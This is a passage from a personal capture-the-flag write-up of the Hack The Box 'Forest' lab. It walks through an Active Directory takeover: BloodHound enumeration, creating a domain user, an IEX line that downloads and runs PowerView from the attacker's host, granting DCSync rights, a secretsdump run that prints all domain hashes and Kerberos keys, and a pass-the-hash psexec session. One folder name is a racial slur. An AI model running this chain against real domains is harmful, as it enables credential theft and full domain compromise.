Enumeration finished in 00:00:02.5669668
Compressing data to .\20210905034048_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 3:40 AM on 9/5/2021! Happy Graphing!

*Evil-WinRM* PS C:\temp> ls


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         9/5/2021   2:38 AM                nigga
-a----         9/5/2021   3:40 AM          15265 20210905034048_BloodHound.zip
-a----         9/5/2021   3:40 AM          23611 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----         9/5/2021   3:39 AM         833024 SharpHound.exe
-a----         9/5/2021   7:38 AM        1923584 winPEASx64.exe

```
and this saves 2 files, we need send the zip file to local machine to open it  in bloodhound
and we goin to do that using base64 encoding and then decoding

aight! now we gonna run neo4j console and blood hound

```
╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ──────────────────────────────────────────────────────────────────────────────────────────── 1 ✘  took 4s  at 09:18:31 
╰─ sudo neo4j console
Directories in use:
  home:         /usr/share/neo4j
  config:       /usr/share/neo4j/conf
  logs:         /usr/share/neo4j/logs
  plugins:      /usr/share/neo4j/plugins
  import:       /usr/share/neo4j/import
  data:         /usr/share/neo4j/data
  certificates: /usr/share/neo4j/certificates
  run:          /usr/share/neo4j/run
Starting Neo4j.
WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
2021-09-05 16:18:42.096+0000 INFO  Starting...
2021-09-05 16:18:44.133+0000 INFO  ======== Neo4j 4.2.1 ========
2021-09-05 16:18:48.080+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2021-09-05 16:18:48.086+0000 INFO  Setting up initial user from defaults: neo4j
2021-09-05 16:18:48.086+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=true, suspended=false)
2021-09-05 16:18:48.143+0000 INFO  Setting version for 'security-users' to 2
2021-09-05 16:18:48.157+0000 INFO  After initialization of system graph model component 'security-users' have version 2 and status CURRENT
2021-09-05 16:18:48.170+0000 INFO  Performing postInitialization step for component 'security-users' with version 2 and status CURRENT
2021-09-05 16:18:50.068+0000 INFO  Bolt enabled on localhost:7687.
2021-09-05 16:18:51.075+0000 INFO  Remote interface available at http://localhost:7474/
2021-09-05 16:18:51.075+0000 INFO  Started.


```

![[Pasted image 20210905092401.png]]

lets just drag and drop the file got from the box

![[Pasted image 20210905092930.png]]

and we get to see some nice graphs. LMAOO! jk

lets break it all down, we can clearly see user _svc-alfresco_ is a member of service accounts and _IT privileged accounts_ and account opertors also, therefore user _svc-alfresco_ can create other users on the domain and modify there permission 

The _Account Operators_ group has _GenericAll_ permission on the _Exchange Windows Permissions_ group. This permission essentially gives members full control of the group and therefore allows members to directly modify group membership. Since _svc-alfresco_ is a member of _Account Operators_, user is able to modify the permissions of the _Exchange Windows Permissions_ group.
    
The _Exchange Windows Permission_ group has _WriteDacl_ permission on the domain _HTB.LOCAL_. This permission allows members to modify the DACL (Discretionary Access Control List) on the domain. We’ll abuse this to grant ourselves DcSync privileges, which will give us the right to perform domain replication and dump all the password hashes from the domain.

# Putting all the pieces together, the following is our attack map
#### Create a user on the domain. This is possible because _svc-alfresco_ is a member of the group _Account Operators_.

```*Evil-WinRM* PS C:\temp> net user cyx password /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\temp> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     Administrator            andy
cyx                      DefaultAccount           Guest
HealthMailbox0659cc1     HealthMailbox670628e     HealthMailbox6ded678
HealthMailbox7108a4e     HealthMailbox83d6781     HealthMailbox968e74d
HealthMailboxb01ac64     HealthMailboxc0a90c9     HealthMailboxc3d7722
HealthMailboxfc9daad     HealthMailboxfd87238     krbtgt
lucinda                  mark                     santi
sebastien                SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb     SM_681f53d4942840e18     SM_75a538d3025e4db9a
SM_7c96b981967141ebb     SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b     svc-alfresco
The command completed with one or more errors.

```
    
#### Add the user to the _Exchange Windows Permission_ group. This is possible because _svc-alfresco_ has _GenericAll_ permissions on the _Exchange Windows Permissions_ group.
    
```
*Evil-WinRM* PS C:\temp> net group "Exchange Windows Permissions" /add cyx
The command completed successfully.

*Evil-WinRM* PS C:\temp> net user cyx
User name                    cyx
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/5/2021 4:38:06 AM
Password expires             Never
Password changeable          9/6/2021 4:38:06 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.

```

	
####  Give the user DcSync privileges. This is possible because the user is a part of the _Exchange Windows Permissions_ group which has _WriteDacl_ permission on the _htb.local_ domain.
   we goin to do that using powerview
   ```
	*Evil-WinRM* PS C:\temp> IEX(New-Object 		 Net.WebClient).downloadString('http://10.10.14.45:8080/PowerView.ps1')
	*Evil-WinRM* PS C:\temp> $pass = convertto-securestring 'password' -AsPlainText -Force
	*Evil-WinRM* PS C:\temp> $cred = New-Object System.Management.Automation.PSCredential('htb\cyx', $pass)
	*Evil-WinRM* PS C:\temp> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity cyx -Rights DCSync
 
   ```
#### Perform a DcSync attack and dump the password hashes of all the users on the domain.
and we got some ntlm hashes
```╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ──────────────────────────────────────────────────────────────────────────────────────────────────────── ✔  at 10:25:55 
╰─ impacket-secretsdump htb.local/cyx:password@10.129.215.16
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
cyx:10101:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:6f74ea9371b1049376b6280c8e0f0731:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
cyx:aes256-cts-hmac-sha1-96:c583aac15d4b0ccde9b8f9b70862f912194cc4e49ffe1b3370db2d985902d559
cyx:aes128-cts-hmac-sha1-96:a64ae336689b593feddcb71ead71b264
cyx:des-cbc-md5:0e79d59bdc92c24c
FOREST$:aes256-cts-hmac-sha1-96:436bb9ae0cf5796398fafe5ff9bdff2ad2d9159151a3da186753c95c708ffd9f
FOREST$:aes128-cts-hmac-sha1-96:51ff1311236394aa15091e4b7029f142
FOREST$:des-cbc-md5:e0c43de6544f5e83
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```
#### access to the administrator’s account.
```lets log into the admin using impacker psexec
╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ───────────────────────────────────────────────────────────────────────────────────────── INT ✘  took 40s  at 10:35:36 
╰─ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.215.16
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.129.215.16.....
[*] Found writable share ADMIN$
[*] Uploading file yaMDfIhx.exe
[*] Opening SVCManager on 10.129.215.16.....
[*] Creating service McTv on 10.129.215.16.....
[*] Starting service McTv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd /Users/Administrator

C:\Users\Administrator>dir   	
 Volume in drive C has no label.
 Volume Serial Number is 61F2-A88F

 Directory of C:\Users\Administrator

09/18/2019  10:09 AM    <DIR>          .
09/18/2019  10:09 AM    <DIR>          ..
09/20/2019  04:04 PM    <DIR>          Contacts
09/23/2019  02:15 PM    <DIR>          Desktop
09/23/2019  03:46 PM    <DIR>          Documents
09/20/2019  04:04 PM    <DIR>          Downloads
09/20/2019  04:04 PM    <DIR>          Favorites
09/20/2019  04:04 PM    <DIR>          Links
09/20/2019  04:04 PM    <DIR>          Music
09/20/2019  04:04 PM    <DIR>          Pictures
09/20/2019  04:04 PM    <DIR>          Saved Games
09/20/2019  04:04 PM    <DIR>          Searches
09/20/2019  04:04 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  10,380,050,432 bytes free

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 61F2-A88F

 Directory of C:\Users\Administrator\Desktop

09/23/2019  02:15 PM    <DIR>          .
09/23/2019  02:15 PM    <DIR>          ..
09/04/2021  08:26 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  10,380,050,432 bytes free

```

PWNED!!!!!!!!!!!!!!!!!!!!!!!!!!

```╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ───────────────────────────────────────────────────────────────────────────────────────── INT ✘  took 40s  at 10:35:36 
╰─ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.215.16
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.129.215.16.....
[*] Found writable share ADMIN$
[*] Uploading file yaMDfIhx.exe
[*] Opening SVCManager on 10.129.215.16.....
[*] Creating service McTv on 10.129.215.16.....
[*] Starting service McTv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd /Users/Administrator

C:\Users\Administrator>dir   	
 Volume in drive C has no label.
 Volume Serial Number is 61F2-A88F

 Directory of C:\Users\Administrator

09/18/2019  10:09 AM    <DIR>          .
09/18/2019  10:09 AM    <DIR>          ..
09/20/2019  04:04 PM    <DIR>          Contacts
09/23/2019  02:15 PM    <DIR>          Desktop
09/23/2019  03:46 PM    <DIR>          Documents
09/20/2019  04:04 PM    <DIR>          Downloads
09/20/2019  04:04 PM    <DIR>          Favorites
09/20/2019  04:04 PM    <DIR>          Links
09/20/2019  04:04 PM    <DIR>          Music
09/20/2019  04:04 PM    <DIR>          Pictures
09/20/2019  04:04 PM    <DIR>          Saved Games
09/20/2019  04:04 PM    <DIR>          Searches
09/20/2019  04:04 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  10,380,050,432 bytes free

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 61F2-A88F

 Directory of C:\Users\Administrator\Desktop

09/23/2019  02:15 PM    <DIR>          .
09/23/2019  02:15 PM    <DIR>          ..
09/04/2021  08:26 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  10,380,050,432 bytes free

C:\Users\Administrator\Desktop>type root.txt
854f0e05100c825eda67b0ed39939b5b

C:\Users\Administrator\Desktop>cd /Users 

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 61F2-A88F

 Directory of C:\Users

09/22/2019  04:02 PM    <DIR>          .
09/22/2019  04:02 PM    <DIR>          ..
09/18/2019  10:09 AM    <DIR>          Administrator
11/20/2016  07:39 PM    <DIR>          Public
09/22/2019  03:29 PM    <DIR>          sebastien
09/05/2021  03:51 AM    <DIR>          svc-alfresco
               0 File(s)              0 bytes
               6 Dir(s)  10,379,919,360 bytes free

C:\Users>cd svc-alfresco

C:\Users\svc-alfresco>cd Desktop

C:\Users\svc-alfresco\Desktop>type user.txt
98b866323bc05216737118f7fdb5c177

C:\Users\svc-alfresco\Desktop>^CTraceback (most recent call last):
  File "/usr/share/doc/python3-impacket/examples/psexec.py", line 513, in <module>
    executer.run(remoteName, options.target_ip)
  File "/usr/share/doc/python3-impacket/examples/psexec.py", line 94, in run
    self.doStuff(rpctransport)
  File "/usr/share/doc/python3-impacket/examples/psexec.py", line 192, in doStuff
    ans = s.readNamedPipe(tid,fid_main,8)
  File "/home/cyx/.local/lib/python3.9/site-packages/impacket/smbconnection.py", line 783, in readNamedPipe
    return self.readFile(treeId, fileId, bytesToRead = bytesToRead, singleCall = True)
  File "/home/cyx/.local/lib/python3.9/site-packages/impacket/smbconnection.py", line 604, in readFile
    bytesRead = self._SMBConnection.read_andx(treeId, fileId, offset, toRead)
  File "/home/cyx/.local/lib/python3.9/site-packages/impacket/smb3.py", line 1979, in read_andx
    return self.read(tid, fid, offset, max_size, wait_answer)
  File "/home/cyx/.local/lib/python3.9/site-packages/impacket/smb3.py", line 1314, in read
    ans = self.recvSMB(packetID)
  File "/home/cyx/.local/lib/python3.9/site-packages/impacket/smb3.py", line 458, in recvSMB
    data = self._NetBIOSSession.recv_packet(self._timeout)
  File "/home/cyx/.local/lib/python3.9/site-packages/impacket/nmb.py", line 915, in recv_packet
    data = self.__read(timeout)
  File "/home/cyx/.local/lib/python3.9/site-packages/impacket/nmb.py", line 1002, in __read
    data = self.read_function(4, timeout)
  File "/home/cyx/.local/lib/python3.9/site-packages/impacket/nmb.py", line 984, in non_polling_read
    received = self._sock.recv(bytes_left)
KeyboardInterrupt

╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ────────────────────────────────────────────────────────────────────────────────────── INT ✘  took 6m 16s  at 10:41:54 
╰─ 

```